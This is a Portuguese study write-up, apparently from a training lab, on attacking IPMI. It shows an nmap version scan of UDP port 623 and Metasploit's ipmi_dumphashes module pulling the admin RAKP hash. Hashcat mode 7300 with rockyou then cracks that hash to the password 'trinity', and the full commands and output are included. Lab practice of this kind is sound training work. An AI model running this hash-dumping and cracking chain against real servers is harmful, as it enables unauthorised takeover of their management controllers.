# 🏴️ IPMI — Estudo Footprinting

---

## Enumeração

### 1. Scan Nmap IPMI

Aqui estou enumerando o serviço IPMI utilizando o script nmap específico para IPMI.

```
sudo nmap -sU --script ipmi-version -p 623 10.129.202.5
```

**Retorno:**

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-19 14:21 CDT
Nmap scan report for 10.129.202.5
Host is up (0.0074s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version: 
|   Version: 
|     IPMI-2.0
|   UserAuth: password, md5, md2, null
|   PassAuth: auth_msg, auth_user, non_null_user
|_  Level: 1.5, 2.0

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

**Informações coletadas:**
- Versão: IPMI-2.0
- Porta: 623/UDP
- Métodos de autenticação: password, md5, md2, null

### 2. Metasploit - Enumeração IPMI Version

Agora vou utilizar o Metasploit para fazer uma enumeração mais completa do serviço IPMI.

```
msfconsole
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS 10.129.202.5
show options
run
```

**Retorno:**

```
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/ipmi/ipmi_version 
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_version) >> set RHOSTS 10.129.202.5
RHOSTS => 10.129.202.5
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_version) >> show options

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.202.5     yes       The target host(s)
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads

[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_version) >> run
[*] Sending IPMI requests to 10.129.202.5->10.129.202.5 (1 hosts)
[+] 10.129.202.5:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Informações coletadas:**
- Confirmação da versão IPMI-2.0

### 3. Metasploit - Dump de Hashes

Aqui estou tentando extrair os hashes de senha do IPMI para posterior cracking.

```
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.129.202.5
run
```

**Retorno:**

```
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/ipmi/ipmi_dumphashes
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> set RHOSTS 10.129.202.5
RHOSTS => 10.129.202.5
[msf](Jobs:0 Agents:0) auxiliary/scanner/ipmi/ipmi_dumphashes) >> run
[+] 10.129.202.5:623 - IPMI - Hash found: admin:3f23cfd48200000076a1e81f6f94c275a98e92d2f7d0f646607fcdc33a461fe705d48db5fae01fa7a123456789abcdefa123456789abcdef140561646d696e:3cdc70bca60327e399a1f84eb629359b2926f561
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Informações coletadas:**
- Hash encontrado para usuário admin

### 4. Tentativa de Brute Force com Hashcat

Aqui estou tentando crackear a senha usando hashcat com brute force.

```
hashcat -m 7300 hash.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

**Retorno:**

```
hashcat (v6.2.6) starting
...
Time.Estimated...: Sat May 23 06:13:53 2026 (3 days, 16 hours)
...
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => b
```

**Informações coletadas:**
- Tempo estimado muito alto, então abortou

### 5. Tentativa com Wordlist Rockyou

Aqui estou usando o rockyou.txt para crackear o hash.

```
sudo gunzip rockyou.txt.gz
hashcat -m 7300 hash.txt /usr/share/wordlists/rockyou.txt --username
```

**Retorno:**

```
hashcat (v6.2.6) starting
...
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

3f23cfd48200000076a1e81f6f94c275a98e92d2f7d0f646607fcdc33a461fe705d48db5fae01fa7a123456789abcdefa123456789abcdef140561646d696e:3cdc70bca60327e399a1f84eb629359b2926f561:trinity
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
...
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

**Informações coletadas:**
- **Senha/crackeada:** trinity

---

## Resumo

| Campo | Valor |
|:------|:------|
| **Versão** | IPMI-2.0 |
| **Porta** | 623/UDP |
| **Usuário** | admin |
| **Hash** | 3f23cfd48200000076a1e81f6f94c275a98e92d2f7d0f646607fcdc33a461fe705d48db5fae01fa7a123456789abcdefa123456789abcdef140561646d696e:3cdc70bca60327e399a1f84eb629359b2926f561 |
| **Senha crackeada** | trinity |
| **Métodos Auth** | password, md5, md2, null |
| **Ferramentas** | nmap, Metasploit, hashcat |

---

## Referências

- [Nmap IPMI Script](https://nmap.org/nsedoc/scripts/ipmi-version.html)
- [IPMI 2.0 Vulnerabilities](https://www.ernw.de/en/security/advisories.html)
- [Hashcat IPMI](https://hashcat.net/wiki/doku.php?id=example_hashes)